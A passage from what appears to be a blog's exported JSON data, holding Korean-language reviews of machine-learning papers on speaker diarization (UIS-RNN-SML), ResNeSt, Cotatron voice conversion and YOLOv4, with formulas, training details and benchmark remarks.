들을 사용했고 (arbitrary K classes, MI maximization, style contrastive learning), \r\n결과도 이전 연구 성능보다 outperform 해서 좋았습니다.\r\n\r\n결론 : 굳\r\n","excerpt":"TL;DR 최근에 Clova AI 에서 unsupervised image 2 image translation 관련 논문이 나와서 한번 빠르게 봤습니다. 일단 제목부터가 재밌는데 TUNIT, Truly Unsupervised Image to Image…","fields":{"slug":"/TUNIT/"},"frontmatter":{"date":"Jun 16, 2020","title":"TUNIT Rethinking the Truly Unsupervised Image-to-Image Translation","tags":["Deep-Learning"],"update":"Jun 16, 2020"}}},{"node":{"rawMarkdownBody":"\n## TL;DR\n\n평소에 speaker diarization task 에 정말 관심이 많고, 이전에 이쪽 분야 (speech domain 쪽 전반적으로) 업무를 하다가, \n최근에 다시 이쪽 분야 trend 는 어떤지 궁금해서 예전에 UIS-RNN 기반으로 speaker diarization pipeline 구현하던 게 생각나서 찾아보다 발견해서 읽게 됐습니당.\n\npaper : [arXiv](https://arxiv.org/pdf/1911.01266.pdf)\n\ncode : [github](https://github.com/DonkeyShot21/uis-rnn-sml)\n\n## Related Work\n\nDL approach Speaker Diarization 논문들\n\n* UIS-RNN : [paper](https://arxiv.org/pdf/1810.04719.pdf)\n* BLSTM-EEND : [paper](https://arxiv.org/pdf/1909.05952.pdf)\n* SA-EEND : [apper](https://arxiv.org/pdf/1909.06247.pdf)\n* RPNSD : [paper](https://arxiv.org/pdf/2002.06220.pdf)\n* DNCSD : [paper](https://arxiv.org/pdf/1910.09703.pdf)\n\n## Introduce\n\n18년도에 구글에서 `UIS-RNN` 이란 `d-vector` based feature extractor speaker diarization 이 나왔는데, \nSample Mean Loss (SML) 을 사용해 speaker 의 turn behavior 를 더 잘 잡는다고 합니다.\n\n결론적으로 이번에 제안한 method 가 online method 에서 `UIS-RNN` 보다 성능이 올라갔고, offline method 에서 AHC (Agglomerative Hierachical Clustering) w/ PLDA scoring 과 비슷한 성능을 낸다고 캅니다.\n\n## Proposed Approach\n\nembeddings $X = (x_1, ..., x_T)$, speaker labels $Y = (y_1, ... y_T)$ (T는 no of frames) 이라고 할 때,\ndiarization task 를 확률 모델 적으로 아래 식으로 joint probability 를 maximize 할 수 있죠\n\n> $ \\hat{Y}  = arg max_{Y} P(X, Y)$ \n\n이 문제를 online generative problem 으로 바꿔본다면, 식이 아래와 같이 써 볼 수 있겠죠?\n\n> $p(x_t, y_t, z_t\\|x_{[t-1]}, y_{[t-1]} z_{[t-1]}) = p(x_t\\|x_{[t-1]}, y_t) * p(y_t\\|y_{[t-1]}, z_t)) * p(z_t\\|z_{[t-1]})), (time  t)$\n\n$x_t, y_t, z_t$ 에 대한 조건부 확률을 순서대로 보면 \n\n* $x_t$ : sequence generation\n* $y_t$ : assignment (speaker)\n* $z_t$ : speaker change\n\n`UIS-RNN` 에서...\n\n* **speaker change** 는 coin flipping process 로 $p_0$ 란 transition parameter 1개로 처리 되었고\n* **speaker assignment** 는 distance dependent Chinese Restaurant Process (ddCRP) 로 bayesian non-parametric process 로 풀었고 (time domain 에서 얼마나 화자가 교차로 배치되었는지?)\n* **sequence generation** 은 GRU (Gated Recurrent Unit) 을 사용해서 처리\n\n### UIS-RNN\n\n기존의 `UIS-RNN`은 아래와 같은 diagram 처럼 훈련이 되고 있는데요,\n\n![img](uis-rnn.png)\n\nDataset $D = {(X_1, ..., X_M), (Y_1, ..., Y_M)}$ ($M$, sequences of embeddings, related labels) 이라 하면, \n$\\theta^*$ 를 통해 아래와 같은 log likelihood 를 minimizing 시키는 겁니다.\n\n>  $L = \\sum_{m=1}^{D} - ln p(X_m\\|Y_M;\\theta)$\n\n위에 sequence generation 에 대한 formula 와 바로 위 log likelihood 식을 MSE fashion 으로 적어보면 다음과 같습니다.\n\n> $L_{MSE} = \\sum_{i=1}^{\\|D_A\\|} \\sum_{j=1}^{\\|A_i\\|} \\|\\|a_{i,j} - \\mu (GRU_{\\theta} (a_{i, [j-1]}))\\|\\|^2$\n\n또, data augmentation 을 진행하는데, S 명의 화자, P permutations 가 적용된다면, $D_A = (A_1, ..., A_{S \\times P})$, \neach sequence 인 $A_i = (a_{i,1}, ..., a_{i,L_i} \\in D_A$ 들은 concat 되고 random 하게 permute 됩니다.\n\n그런데 여기서 sequences 가 shuffle 된다면, 다음에 어떤 embedding 이 와야하는 지, observation 간의 어떠한 관계를 학습을 못하게 되죠.\n위 공식과 같이 네트워크는 각 embedding 들의 mean distribution 을 예측하도록 학습되겠죠!\n\n### UIS-RNN-SML\n\n이번 논문에서 제안한`UIS-RNN-SML`은 아래와 같은 diagram 처럼 훈련이 되고 있는데요,\n\n![img](uis-rnn-sml.png)\n\n이전 `UIS-RNN` 과 비슷하지만, $1 ~ j-1 th$ embeddings 와 $j ~ L th$ embeddings 부분을 sampling 해서 똑같이 mean 해서 구한 후 MSE 를 구해줍니다.\n\n이렇게 $j - 1 th$ 이후의 sequence 를 sampling 해서 mean 해서 구한다고 해서 네이밍을 Sample Mean Loss 라고 했군요.\n\n그럼 공식은 조금 변형되서 이렇게 되겠네요\n\n> $L_{MSE} = \\sum_{i=1}^{\\|D_A\\|} \\sum_{j=1}^{\\|A_i\\|} \\|\\|E(s(i)) - \\mu (GRU_{\\theta} (a_{i, [j-1]}))\\|\\|^2$, $s(i)$ = embedding distribution of i-th speaker\n\n하지만 실제 probability distribution 은 없기도 하고 제한된 레이블된 데이터로 하다보면 overfit 될 거 같은 느낌이 들 거 같다면서, \nunseen samples 에 대한 mean 을 예측하는 network 를 위해 gt 를 만들었다고 하네요. \n\npermuted sequence 에서 직접 랜덤하게 가져왔다는데, generic sequence $A_i$ 에 대한 subset $H = (h_1, ..., h_N)$, $N$ 은 랜덤하게 sample 된 embedding,\n즉, $\\hat{\\mu_A} (A_i) = (\\sum_{i}^{N} h_i) / N$ 로 써 볼 수 있겠네요. ($N$ 이 아니라 $N - i$ 아닌가)\n\n그럼 식을 다시 써 보면 이렇게 되겠네요.\n\n> $L_{SML} = \\sum_{i=1}^{\\|D_A\\|} \\sum_{j=1}^{\\|A_i\\|} \\|\\|\\hat{\\mu_A}(a_{i,[j,L_i}) - \\mu (GRU_{\\theta} (a_{i, [j-1]}))\\|\\|^2$\n\n### New Speaker Probability\n\n이전에 `UIS-RNN` 의 큰 장점 중 하나가 unbounded 된 화자 수를 모델링 했다는 점인데 (ddCRP), 이전에 보였던 화자와 새롭게 등장한 화자로 switching 이 잘 된다는 점 입니다.\n\n아래처럼 써 볼 수 있을텐데,\n\n> $p(y_t = k\\|z_t = 1, y_{[t-1]}) \\propto N_{k,t-1}$\n\n> $p(y_t = max(y_{[t-1}) + 1\\|z_t = 1, y_{[t-1]}) \\propto \\alpha$\n\n$N_{k,t-1}$ 은 speaker $k$ 에 대한 연속적인 segment 들. 여기서는 $\\alpha$ 란 parameter 하나에 의해 결정됩니다. 만약 $\\alpha$ 가 크다면 speaker 수를 과대평가(?) 할 수도 있겠죠.\n\n그래서 이 부분을 다시 제안하는데,\n\n$\\alpha = \\frac{\\sum_{m=1}^{D} (max(Y_m) - 1)}{\\sum_{m=1}^{D} \\sum_{t=1}^{Y_m} 1 (y_{m,t} \\ne y_{m,t+1})}$\n\n이렇게 하면 잘못된 metric 이나 휴리스틱하게 결정되는 거로부터 방지가 가능하겠죠\n\n## Experiment Result\n\n### DIHARD-2 Benchmark\n\n해당 dataset 에서 evaluate 했을 때, UIS-RNN 보다 outperform 한 성능을 보여주네요.\n\n![img](dihard2-benchmark.png)\n\n각 환경에 따른 DER (Diarization Error Rate) 변화도 보여줬는데, Audiobooks 이외엔 전부 outperform 합니다. \n\n이 부분을 논문에서도 설명하는데, `UIS-RNN-SML` 은 `평균`을 더 잘 맞추려 하고, cluster 간 variance 가 작다는 점에서 대부분의 cases 에선 잘 동작하는데,\n화자 수가 거의 없는 환경에서는 performance degradation 이 존재할거라 합니다 (by $\\alpha$, $p_0$).  \n\n![img](dihard2-domain-benchmark.png)\n\n### Cluster Mean Variance (at training time)\n\nSML 적용으로 cluster 간 variance 가 stable 해진 점도 굳\n\n![img](cluster-mean-variance.png)\n\n## Conclusion\n\n`UIS-RNN` 같은 경우엔 `d-vector` 을 feature extractor 로 사용하는데 v1 ~ v3 까지 dataset 과 training recipe 차이에 따라 엄청난 성능 비약이 있어서,\n요걸 실제로 재현하거나 훈련할 수가 없었습니다. \n\n이전에 직접 훈련한 feature extractor 기반으로 했는데 좋은 성능을 기대하진 못했습니다 ㅠㅠ\n\n물론 아직도 더 많은 종류의 dataset, 더 좋은 training recipe 에 따라 (feature extractor 의 성능) \nspeaker diarization 성능이 어쩌면 (당연하게?) 결정된다고 생각하는데, 더 많은 dataset 과 pre-trained 모델이 공개되면 좋겠다란 바람이 있네요!\n\n그래도 해당 논문은 `x-vector` 기반으로 재현을 하였고, `SML loss` 사용이 전 make sense 하고 좋은 method 라 생각해서 재밌게 읽었습니다!\n\n특히 cluster 별 mean variance 가 거의 일정하게 낮음을 유지하는 부분이 인상적 이였고, \nspeaker embedding 을 extract 할 때 `x-vector` 가 아닌 구글이 가지고 있는 `d-vector v3` 을 사용했으면 얼마나 더 좋은 성능이 나왔을 지도 궁금해 지네요.\n\n결론 : 굳굳\n","excerpt":"TL;DR 평소에 speaker diarization task 에 정말 관심이 많고, 이전에 이쪽 분야 (speech domain 쪽 전반적으로) 업무를 하다가, \n최근에 다시 이쪽 분야 trend 는 어떤지 궁금해서 예전에 UIS-RNN 기반으로 …","fields":{"slug":"/UIS-RNN-SML/"},"frontmatter":{"date":"Jun 06, 2020","title":"UIS-RNN-SML SUPERVISED ONLINE DIARIZATION WITH SAMPLE MEAN LOSS FOR MULTI-DOMAIN DATA","tags":["Deep-Learning"],"update":"Jun 06, 2020"}}},{"node":{"rawMarkdownBody":"\r\n## TL;DR\r\n\r\nAmazon 에서 지난달에 재밌는 논문이 나왔는데요, 새로운 image classification architecture 를 제안했는데, \r\nEfficientNet 보다 더 좋은 성능을 보이는 human-made architecture 를 선보였습니다. 멋지죠?\r\n\r\n핵심은 *Split-Attention* 을 사용하는것 인데요, 자세한 건 본문에\r\n\r\n결론은 ImageNet 에서 새로운 SOTA 를 찍었습니다.\r\n\r\npaper : [arXiv](https://arxiv.org/pdf/2004.08955.pdf)\r\n\r\ncode : [github](https://github.com/zhanghang1989/ResNeSt)\r\n\r\n## Related Work\r\n\r\nResNet 계열 논문들\r\n\r\n* ResNet : [paper](https://www.cv-foundation.org/openaccess/content_cvpr_2016/papers/He_Deep_Residual_Learning_CVPR_2016_paper.pdf)\r\n* ResNetV2 : [paper](https://arxiv.org/pdf/1603.05027.pdf)\r\n* ResNeXt : [paper](https://arxiv.org/pdf/1611.05431.pdf)\r\n\r\n## Introduce\r\n\r\nintroduction 에서는 크게 2가지 문제점들을 들면서 소개하는데요,\r\n\r\n### Computation\r\n\r\n최근에 EfficientNet 같은 architecture 들을 보면 ImageNet 에서 정말 높은 acc 를 보여주고 있는데요,\r\n그런데 성능은 정말 좋지만, AutoML 로 architecture search 를 하다 보니, accuracy 는 고려돼도, training efficiency 는 고려하지 못해서, 실제로 이걸\r\ntraining 하려고 하면 **computation cost 가 꽤 많이 듭니다**.\r\n\r\n### Transfer Learning\r\n\r\n위 architecture 들을 backbone 으로 하는 downstream task 들을 훈련할 때도 한계점으로 듭니다.\r\n\r\n주로 ResNet 기반의 architecture 를 사용했는데, 요런 backbone 들은 해당 downstream task 에 optimal 한 구조가 아니기 때문에 (lack of receptive field, cross-channel interaction)\r\n해당 task 들에 맞게 구조를 바꿔야 한다고 합니다.\r\n\r\n또한, 실제로 EfficientNet 을 backbone 으로 사용할 때 다른 architecture 보다 성능이 고만고만한 경우도 꽤 있어요. (기대한 만큼 x)\r\n\r\n요약하면, **cross-channel representation 을 잘 뽑아주는 구조**가 필요하다 입니다.\r\n\r\n## Architecture\r\n\r\n아래는 이번 논문에서 제안한 *Split-Attention* 이 적용된 block 입니다.\r\n\r\n![img](resnest-blocks.png)\r\n\r\n왼쪽부터 순서대로 *SE-Net block*, *SK-Net block*, *ResNeSt block* 입니다.\r\n\r\n*ResNeSt* 는 *ResNeXt* 와 *SK-Net* concept 을 합친 거라 보시면 될 듯 합니다.\r\n\r\n### Split-Attention Networks\r\n\r\n*Split-Attention* block 은 크게 2가지 part 로 구성되어 있는데, *feature-map group*, *split-attention operation* 입니다.\r\n\r\n*feature-map group* 은 ResNeXt 에 나오는 concept 이니 핵심인 *split-attention* 부분만 다뤄 보겠습니다.\r\n\r\n![img](split-attention-block.png)\r\n\r\n1. 각 cardinal group 에서 $r$ 개의 splits 들에 대해 element-wise 하게 sum 해줍니다.\r\n> $\\hat{U}^k = \\sum_{j=R(k-1)+1}^{R_k} U_j$ , $\\hat{U}^k \\in \\Bbb{R}^{H \\times W \\times C / K}$ for $k \\in 1, ..., K$\r\n2. GAP 로 spatial features 를 squeeze 해 줍니다.\r\n3. *Dense $c'$ + BN + ReLU* -> *Dense $c$* 로 excitation 하고\r\n5. attention feature 와 original feature 하고 element-wise 하게 mul 해 주고\r\n6. 마지막으로 element-wise 하게 sum 해 줍니다.\r\n\r\n### ResNeSt Block\r\n\r\n위 *Split-Attention* block 들이 각 cardinal group 별로 적용된 후에 모두 concat 후에 conv 1x1 되고 skip connection 이 element-wise sum 되는 형태 입니다.\r\n\r\n만약 down-sample 되는 block 이라면 \r\nskip-connect 부분이 channel size alignment 를 위해 strided convolution or convolution + pooling 이 될 수 있다고 하네요.\r\n\r\n### Etc (computation, etc)\r\n\r\nnetwork 디자인을 봤을 때 computation 적으로 training 시 이전 구현체들 보다 효율적이다 등등을 말하네요\r\n\r\n## Training Recipe\r\n\r\n요약\r\n\r\n1. average down-sampling : 이전 ResNet 들은 strided conv 3x3 w/ (zero padding) 로 pooling 함 -> avg pool 3x3 으로 pooling (zero-padding boundary 처리는 dense prediction task 에 sub-optimal 함)\r\n2. tweak ResNet-D : stem conv kernel size 가 7x7 -> conv 3x3 3층 (same receptive field 가지며, 더 computation 효율적으로)\r\n3. learning rate : lr = 0.1 로 5 epochs warm-up, cosine scheduling, $lr = B/256 * lr_base$\r\n4. BN : $\\gamma$ = 0 으로 init\r\n5. label smoothing 함\r\n6. AutoAugment 씀\r\n7. MixUp 씀\r\n8. Large Crop Size\r\n9. Regularization : DropBlock (p = 0.2) 씀, l2 weight decay\r\n\r\n## Experiment Result\r\n\r\n### ImageNet\r\n\r\n#### ResNet based Benchmark\r\n\r\nResNet 계열 architecture benchmark 결과인데 제일 좋은 top-1 acc 를 보입니다.\r\n\r\n![img](imagenet-benchmark-resnet-based.png)\r\n\r\n#### SOTA Benchmark\r\n\r\n이전 다른 SOTA 들하고 비교해 봐도 latency / accuracy 둘다 더 좋은 성능을 보여주네용\r\n\r\n![img](imagenet-benchmark.png)\r\n\r\n### Transfer Learning Task\r\n\r\nDownstream tasks 에서도 좋은 결과를 보이고 있습니다.\r\n\r\n#### Object-Detection Benchmark\r\n\r\n![img](object-detection-benchmark.png)\r\n\r\n#### Instance Segmentation Benchmark\r\n\r\n![img](instance-segmentation-benchmark.png)\r\n\r\n#### Semantic Segmentation Benchmark\r\n\r\n![img](semantic-segmentation-benchmark.png)\r\n\r\n## Conclusion\r\n\r\n요즘 architecture 들은 주로 baseline 구조에 AutoML 를 이용한 architecture search 가 이뤄지고 있는데,\r\n이렇게 아직도 사람이 만든 architecture 에 대한 연구가 나오고 있고, 더 좋은 성능을 냈다는 게 정말 인상적이네요.\r\n\r\n또 전에 구글에서 나온 논문 무언가에서 ResNet 의 모든 convolution 을 attention 으로 교체했더니 더 좋은 성능이 나왔다는 걸 본 적이 있는데,\r\n여기서도 뭔가 더 아이디어를 얻어 볼 수 있을 것 같네요.\r\n\r\n아마 제가 못 찾아본 거일 수도 있지만, Amazon 연구를 별로 본 기억이 없었는데, 이번 연구는 꽤 재밌었어요.\r\n\r\n결론 : 굳굳굳\r\n","excerpt":"TL;DR Amazon 에서 지난달에 재밌는 논문이 나왔는데요, 새로운 image classification architecture 를 제안했는데, \nEfficientNet 보다 더 좋은 성능을 보이는 human-made architecture 를 …","fields":{"slug":"/ResNeSt/"},"frontmatter":{"date":"May 23, 2020","title":"ResNeSt Split-Attention Networks","tags":["Deep-Learning"],"update":"May 23, 2020"}}},{"node":{"rawMarkdownBody":"\r\n## TL;DR\r\n\r\n최근 mindslab 에서 VC (Voice Conversion)관련 논문이 나와서 오랜만에 요 쪽 domain 도 볼 겸 해서 논문을 읽게 됐습니다.\r\n\r\n간단하게 요약하면, 유명한 google 의 TTS model 인 *tacotron2* 기반으로 given transcription 와 mel alignment 를 활용해서 speaker-independent linguistic representation 을 뽑는 concept(?) 입니다.\r\n\r\n결론은 VCTK dataset 에서 최근 paper 인 *Blow* 보다 높은 MOS, DMOS 를 달성했습니다. 아래 링크에 들어가면 모델이 생성한 sample 들을 들어볼 수 있어요.\r\n\r\npaper : [arXiv](https://arxiv.org/pdf/2005.03295.pdf)\r\n\r\ndemo : [link](https://mindslab-ai.github.io/cotatron/)\r\n\r\ncode : 아직 official code / pre-trained model은 없는데, 곧 나올 예정인 듯합니다\r\n\r\n## Related Work\r\n\r\n이전 SOTA 였던 paper\r\n\r\n* Blow : [arXiv](https://arxiv.org/pdf/1906.00794.pdf)\r\n\r\n## Architecture\r\n\r\n*Cotatron*의 전체적인 architecture 는 아래와 같습니다.\r\n\r\n![img](cotatron-architecture.png)\r\n\r\n### 1. speaker-independent linguistic features from TTS\r\n\r\n이번에 제안한 *cotatron* 은 google 의 *tacotron2* 를 기반으로 합니다. \r\n\r\n> $\\hat{M_{1:i}} , A_i = Decoder (Encoder(T), M_{0:i-1}, z^{id})$\r\n\r\n*T* 는 Transcription, *M* 은 log mel-spectogram, *z* 는 speaker representation.\r\n\r\n요거로부터 mel alignment + given transcription + speaker representation 으로 새로운 speech 를 생성합니다.\r\n\r\n이 이후가 중요(?)한데, TTS 훈련 후에, \r\nDecoder output 으로 transcription 과 mel-spectogram 사이의 *Alignment* 가 나오는데, 요 부분을 training 할 때 *teacher-forcing* 기술을 사용해서 훈련했다고 합니다.\r\n\r\n그래서 최종적으로 Speaker-Independent linguistic features 는 다음과 같습니다.\r\n\r\n> $L = matmul(A, Encoder_{text}(T))$\r\n\r\n그런데 한 가지 짚어야 할 점은, \r\n*T* 는 speaker 에 대한 정보가 없는 text 고, \r\n*A* 는 간단히 text 와 mel spectogram 과의 coef 라 할 수 있는데,\r\n즉, *L* 이 speaker 에 대한 정보를 담고 있지 않다는 점이다. 이 부분은 아래에\r\n\r\n*Cotatron*은 이미 *Tacotron2* 기반의 모델이라 multi-speaker speech synthesis 에 well-optimized 됐을 거지만,\r\n조금 더 잘해 보려고(?) 기존의 embedding table 을 걷어내고, speaker representation encoder 를 하나 만들어 넣었다고 합니다.\r\n\r\n해당 encoder 구조는 2d cnn 6 layers + gru 구조로 구성.\r\n\r\n#### speaker disentanglement issue ?\r\n\r\n그래서 이런 speaker disentanglement 에 대한 issue 를 해결하기 위해 speaker classifier 를 추가로 붙여 줬다고 캅니다.\r\n\r\n이 때 사용된 모델은 간단한 1d cnn 4 layers + temporal max-pooling + fc 로 구성.\r\n\r\n### 2. voice conversion\r\n\r\n![img](voice-conversion-system.png)\r\n\r\n위 이미지처럼 voice-conversion system 인데, 전반적인 pipeline 이 그려져 있습니다.\r\n\r\n![img](residual_encoder_vc_decoder.png)\r\n\r\n#### 2.1 residual encoder\r\n\r\nspeech 를 decoding 하는 과정에서 아무리 transcription + speech 에 정보가 잘 있어도 speech 자체 만에 대한 정보도 다양하고 중요하여서,\r\n해당 정보를 따로 encoding 해서 decoder 에서 사용한다고 합니다.\r\n\r\nresidual encoder 의 특징은 \r\n\r\n* 위에 한 번 언급된 speaker encoder 와 비슷한 구조\r\n* temporal information 보존을 위해 time-wise 하게는 stride 적용 x\r\n* 특정 speaker feature 에 overfit 을 막기 위해 작은 channel size 를 사용. \r\n* 결론적으로 single channel output 이 위 문제를 막으면서 잘 동작했다고 캅니다.\r\n* plus) Hann 으로 smoothing 함 ($k = 21$)\r\n\r\n#### 2.2 VC decoder\r\n\r\n위에 image 처럼, Cotatron feature 와 mel encoded feature 가 concat 돼서 들어가고 target speaker id 도 같이 들어갑니다.\r\n\r\n> $M_{s \\to *} = Decoder_{vc} (concat(L_s, R_s), y^{id})$\r\n\r\nVC decoder 구조는 *GAN-TTS* 란 paper 와 유사합니다. head, tail 에 1d conv 가 1 layer 씩 있고, 중간에 GBlock w/ CondBN 4 blocks 있는 형태 입니다.\r\n물론 CondBN 에 Condition 으로 target speaker feature 가 들어갑니다.\r\n\r\n요 decoder 에 대한 모델적인 여러 시도를 했는데 결론적으로 성능 향상은 없었다고 하면서 future works 로 남기며 턴을 종료했습니다.\r\n\r\n### 3. training recipe\r\n\r\n은 논문 참고해 주세요 (~~귀찮~~)\r\n\r\n## Experiment Result\r\n\r\n### VCTK Benchmark (many-to-many)\r\n\r\n![img](vctk_benchmark.png)\r\n\r\n기존 SOTA 인 Blow 보다 훨 높은 MOS, DMOS 를 보여줍니다. SCA 는 Blow 를 넘진 못헀네요.\r\n\r\n### Speaker Disentanglement\r\n\r\n![img](degree_of_speaker_disentanglement.png)\r\n\r\n그냥 Cotatron feature 만 쓸 때와 mel spectogram 만 따로 encoding 해서 쓴 경우와 비교했을 때,\r\nSCA 가 훨씬 높은 걸 보여주네요.\r\n\r\n## Conclusion\r\n\r\n간단한 concept 으로 꽤괜 성능이 나오고,\r\ntranscript 를 주지 않아도 성능이 준 것과 comparable 하다는 점도 재밌고, \r\nCortatron encoder 를 다른 task 에 적용해 봐도 재밌는 결과 볼 수 있을 것 같네용\r\n\r\n결론 : 굳\r\n","excerpt":"TL;DR 최근 mindslab 에서 VC (Voice Conversion)관련 논문이 나와서 오랜만에 요 쪽 domain 도 볼 겸 해서 논문을 읽게 됐습니다. 간단하게 요약하면, 유명한 google 의 TTS model 인 tacotron2 기반…","fields":{"slug":"/Cotatron/"},"frontmatter":{"date":"May 10, 2020","title":"Cotatron Transcription-Guided Speech Encoder for Any-to-Many Voice Conversion without Parallel Data","tags":["Deep-Learning"],"update":"May 10, 2020"}}},{"node":{"rawMarkdownBody":"\r\n## TL;DR\r\n\r\n이번에 리뷰할 논문은 오랜만에 나온 YOLO 4번째 버전인 YOLOv4 논문입니다.\r\n\r\n이번 버전은 이야기가 있는(?) 버전인데, YOLO 원 저자인 Joe Redmon 님 께서 올해 2월쯤에 twit으로 CV 연구를 그만하겠다고 선언하셨는데 (~~정말 YOLO 하러 가셨을까~~),\r\n과연 이번 버전엔 저자에 포함될지, darknet page에는 YOLOv4 가 올라갈지 이야기가 있었는데, 이번 저자로는 빠지셨고 ㅠㅠ darknet 에는 올라갔더라고요.\r\n\r\n쨋든, 요약하면 현재 SOTA 인 EfficientDet 과 비슷한 AP를 달성하면서 높은 FPS를 달성했네요.\r\n\r\npaper : [arXiv](https://arxiv.org/pdf/2004.10934.pdf)\r\ncode : [github](https://github.com/pjreddie/darknet)\r\n\r\n## Related Work\r\n\r\nYOLO 시리즈\r\n\r\n* YOLO v1 : [arXiv](https://arxiv.org/pdf/1506.02640.pdf)\r\n* YOLO v2 : [arXiv](https://arxiv.org/pdf/1612.08242.pdf)\r\n* YOLO v3 : [arXiv](https://pjreddie.com/media/files/papers/YOLOv3.pdf)\r\n\r\n## Introduction\r\n\r\n이번에도 논문에서는 speed를 추구한다고 강조를 하면서 \r\n\r\n0. 누구나 저렴한 GPU 장비로 학습 가능\r\n1. 빠른 operation 사용\r\n2. parallel computing 최적화 등등 \r\n\r\n여러 가지들을 고려했다고 합니다.\r\n\r\n총 2가지의 production serving 환경을 옵션을 들면서 설명하는데,\r\n\r\n### GPU\r\n\r\nconvolution layer 에서 작은 group 들 (1 ~ 8)을 사용했다고 카네요. CSPResNeXt50 / CSPDarknet53 \r\n\r\n### VPU\r\n\r\ngrouped-convolution 을 사용하고, SE Module 를 사용하지 않는다고 하네요.\r\n\r\n## Architecture\r\n\r\n크게 아키텍쳐를 설계하고 튜닝하는 것을 논문에선 3 부분으로 나눠서 설명합니다.\r\n\r\n1. 아키텍쳐 선정\r\n2. BoF, BoS (여러가지 augmentation, activation, layer)\r\n3. 기타 튜닝\r\n\r\n### Selection of Architecture\r\n\r\n이 논문에선 optimal 한 architecture 를 설계하기 위해 총 3가지의 balance 를 고려하는데요,\r\n\r\n1. resolution of input image\r\n2. num of layers\r\n3. num of parameters\r\n\r\nBackbone으로 사용할 network가 ImageNet classification task에선 좋은 성능을 보일진 몰라도\r\nObject Detection task에선 고려해야 할 점이 또 다르기 때문에, 띵킹을 해야 한다라는 점을 언급해요.\r\n\r\n예로는 CSPResNeXt50 가 CSPDarknet53 보다 ImageNet 에선 성능이 좋아도, MS COCO dataset 에서 Object Detection 에선\r\n반대라고 합니다.\r\n\r\n결론적으로 CSPResNeXt50 vs CSPDarknet53 vs EfficientNet-B3 을 backbone 으로 benchmark 결과\r\nCSPDarknet53 이 detector backbone 으로 사용하기 optimal 하다는 결론을 내립니다.\r\n\r\n![img](backbone-benchmark.png)\r\n\r\n또한 SSP Module 을 추가적으로 사용하고 (receptive field 때문에), PANet 을 feature aggregation 을 위해 사용한다고 합니다. (YOLOv3 에서 쓰던 FPN 대신 사용하는 거)\r\n\r\n최종적으로 아래와 같은 architecture 를 사용합니다.\r\n\r\n* `backbone` : CSPDarknet53 w/ SSP \r\n* `neck` : PANet (path-aggregation)\r\n* `head` : YOLOv3 (anchor-based)\r\n\r\n마지막으로 CGBN, SyncBN 같은 multi-gpu / TPU 환경같이 비싼 환경에서 사용하는 operation 들은 사용하지 않았다고 합니다. \r\n\r\n정말 누구나 훈련할 수 있다고 강조를 하네요 ㅋㅋㅋㅋ (~~그런데 1080ti, 2080ti 1개 도 없는 게 현실~~)\r\n\r\n### Selection of BoF and BoS\r\n\r\n여기선 모든 layer 들 loss, metric, augmentation 모든 기법을 나열하면서 괜춘한 걸 고르는 작업을 합니다.\r\n\r\n결론적으로 비싼 operation 들, 비싼 장비용 operation 들은 제외하고 누구나 써 볼 수 있는 operation 들을 고른 결과,\r\n\r\nregularization method 로 DropBlock 을 사용했답니다.\r\n\r\n### Additional improvements\r\n\r\n여기선,\r\n\r\n1. 새로운 augmentation 기법들과 SAT(Self-Adversarial Training)\r\n2. genetic algorithm 으로 hyper-parameter 튜닝\r\n3. 효율적인 훈련을 위해 디자인 변경 -> SAM, PAN module 들 수정, BN -> CmBN (Cross mini)\r\n\r\n#### 1\r\n\r\n결론적으로 기존 CutMix 는 2장의 이미지끼리 blend 하는데, Mosaic 은 4장의 이미지를 섞기 때문에 더 좋아서 (둘 다) 쓴다.\r\n(large mini-batch 사용을 안 해도 된다 등등의 이유)\r\n\r\nSAT 는 구글에 찾아보세요~ (~~귀찮~~)\r\n\r\n#### 3\r\n\r\nSAM 에서 spatial-wise attention 을 point-wise attention 으로 변경\r\nPAN 에서 shortcut 을 concat 으로 변경\r\n\r\n이유는 나와 있지 않은데, SAM 같은 경우엔 그 작은 parameter 몇 개 줄여보겠다는 의도인 것 같고,\r\nPAN 에 concat 은 성능 측면인 것 같네요. (뇌피셜)\r\n\r\n## Summary\r\n\r\n정리 함 다시 해 보면 \r\n\r\n### Architecture\r\n\r\n* `backbone` : CSPDarknet53 w/ SPP\r\n* `neck` : PAN\r\n* `head` : YOLOv3\r\n\r\n### Uses\r\n\r\n적용한 것들을 파트(?)별로 정리해 보면 아래와 같습니다.\r\n\r\n* Bag of Freebies (BoF) for backbone\r\n  * augmentation : CutMix, Mosaic\r\n  * regularization : DropBlock\r\n  * etc : class label smoothing\r\n* Bag of Specials (Bos) for backbone\r\n  * activation : Mish\r\n  * network : CSP, MiWRC\r\n* Bag of Freebies (BoF) for detector\r\n  * augmentation : Mosaic\r\n  * regularization : DropBlock\r\n  * loss : CIoU\r\n  * layer : CmBN\r\n  * lr scheduler : cosine annealing\r\n  * etc : SAT, eliminate grid sensitivity, multiple anchors for a single gt \r\n* Bag of Specials (Bos) for detector\r\n  * activation : Mish\r\n  * module : SPP, SAM, PAN\r\n  * loss : DIoU-NMS\r\n   \r\n## Experiment Result\r\n\r\n### Bof Benchmark\r\n\r\n위에 있는 모든 요소들을 benchmark 한 표.\r\n\r\n![img](bof-benchmark.png)\r\n\r\n### AP, FPS Benchmark\r\n\r\n각 GPU architecture 별로 AP, FPS benchmark 를 했는데, 아래 V100 (volta arch)에서 테스트한 결과.\r\n\r\n![img](ap-fps-benchmark.png)\r\n\r\n빠르네요\r\n\r\n## Conclusion\r\n\r\n이번 논문은 정말 모든 case 들을 하나하나 고려하려는 게 보였고, 설명도 최대한 low-level(?) 하게 하나하나 스킾하지 않고\r\n다 짚고 넘어가서 뭔가 투머치 같지만 좋았어요 \r\n\r\n또 정말 모든 부분 하나하나 튜닝한 점이 꽤 인상적이었어요. 온갖 힙한 것들도 사용하고.\r\n\r\n결론 : 굳굳\r\n","excerpt":"TL;DR 이번에 리뷰할 논문은 오랜만에 나온 YOLO 4번째 버전인 YOLOv4 논문입니다. 이번 버전은 이야기가 있는(?) 버전인데, YOLO 원 저자인 Joe Redmon 님 께서 올해 2월쯤에 twit으로 CV 연구를 그만하겠다고 선언하셨는데…","fields":{"slug":"/YOLOv4/"},"frontmatter":{"date":"Apr 26, 2020","title":"YOLOv4 Optimal Speed and Accuracy of Object Detection","tags":["Deep-Learning"],"update":"Apr 26, 2020"}}},{"node":{"rawMarkdownBody":"\r\n## TL;DR\r\n\r\n이번 포스팅에서 리뷰할 논문은 EfficientNet 기반으로 새로운 techniques 를 적용해서 ImageNet dataset 에서 SOTA 를 찍은 논문입니다.\r\n나온지는 꽤 됐지만, 최근 TPU 에서 돌아가는 요 코드를 짜다가 생각나서 